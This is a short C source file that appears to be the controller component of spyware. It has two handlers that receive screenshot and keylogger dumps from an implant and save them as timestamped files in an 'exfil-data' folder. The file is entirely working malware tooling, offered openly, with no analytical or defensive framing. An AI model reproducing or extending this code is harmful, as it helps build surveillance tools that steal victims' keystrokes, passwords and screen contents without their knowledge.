#include "spyware_controller.h"
#include <stdio.h>
#include <stdlib.h>
#include <time.h>
#include <string.h>

void handle_screenshot_response(Packet *resp)
{
    if (!resp || resp->command_type != COMMAND_RESPONSE) return;

    char filename[64];
    snprintf(filename, sizeof(filename), "exfil-data/screenshot_%ld.bmp", time(NULL));
    FILE *fp = fopen(filename, "wb");
    if (fp) {
        fwrite(resp->payload, 1, resp->payload_len, fp);
        fclose(fp);
        printf("<Screenshot saved to %s (%d bytes)>\n\n", filename, resp->payload_len);
    } else {
        printf("<Failed to open %s for writing>\n\n", filename);
    }
}

void handle_keylog_dump_response(Packet *resp)
{
    if (!resp || resp->command_type != COMMAND_RESPONSE) return;

    char filename[64];
    snprintf(filename, sizeof(filename), "exfil-data/keylog_%ld.txt", time(NULL));
    FILE *fp = fopen(filename, "w");
    if (fp) {
        fwrite(resp->payload, 1, resp->payload_len, fp);
        fclose(fp);
        printf("<Keylog saved to %s (%d bytes)>\n\n", filename, resp->payload_len);
    } else {
        printf("<Failed to open %s for writing>\n\n", filename);
    }
}
